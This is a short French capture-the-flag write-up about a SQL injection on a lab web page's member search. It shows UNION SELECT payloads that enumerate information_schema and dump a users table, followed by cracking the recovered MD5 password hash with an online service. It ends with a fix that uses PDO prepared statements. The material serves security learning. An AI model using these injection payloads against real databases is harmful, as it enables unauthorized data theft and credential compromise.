# Vulnérabilité

Page member: `http://192.168.1.19/?page=member`

Premièrement, il faut tenter de savoir si il y a potentiellement une faille sql pour cela il faut faire cette requête SQL:

`1=1`

Une fois qu'on sait qu'il y a une faille sql, on va chercher a trouver toutes les tables de la base de données, pour cela on va faire une simple requête sql 

`1=1 UNION SELECT table_name, table_schema FROM information_schema.tables;`

Dans le résultat, on trouve une table nommée `users`avec un schéma `Member_Sql_Injection`

Puis on peut lister toutes les colonnes de toutes les tables avec cette injection : 

`1=1 UNION SELECT table_name, column_name FROM information_schema.columns;`

On récupère ainsi 8 colonnes qui nous intéressent : 

`user_id, first_name, last_name, town, country, planet, Commentaire et countersign`


On va donc récupérer toutes les informations de la table avec la méthode concat :

`1=1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM Member_Sql_Injection.users;`

On trouve le hash du mot de passe `5ff9d0165b4f92b14994e5c685cdce28`

J'utilise `https://md5decrypt.net/` pour décrypter le hash et on retrouve alors le mot de passe d'origine `FortyTwo`.
Enfin on encrypte en SHA256 (https://md5decrypt.net/Sha256) et on obtient le flag.



# Solution

Utilisez des requêtes préparées et des instructions paramétrées : Cette technique consiste à utiliser des instructions SQL avec des paramètres qui sont automatiquement échappés par PHP. Cela peut être réalisé avec les extensions PDO ou MySQLi en PHP.

Voici un exemple utilisant PDO :

```
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND status=:status');
$stmt->execute(['email' => $email, 'status' => $status]);

```